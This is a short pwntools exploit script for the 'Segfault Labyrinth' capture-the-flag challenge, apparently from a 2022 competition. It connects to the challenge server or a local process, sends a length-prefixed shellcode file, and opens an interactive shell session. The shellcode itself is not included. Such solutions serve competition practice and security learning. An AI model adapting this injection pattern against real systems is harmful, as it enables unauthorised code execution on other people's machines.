#!/usr/bin/env python3
from pwn import *
import os
import struct
from pathlib import Path

# Change this to exploit locally
EXPLOIT_REMOTE = True

if EXPLOIT_REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process()
    p = gdb.debug("./challenge", gdbscript="")

shellcode_bytes = Path("shellcode/shellcode.bin").read_bytes()
print(p.recvuntil("Welcome to the Segfault Labyrinth\n"))

p.send(struct.pack("<Q", len(shellcode_bytes)))
p.send(shellcode_bytes)

p.interactive()
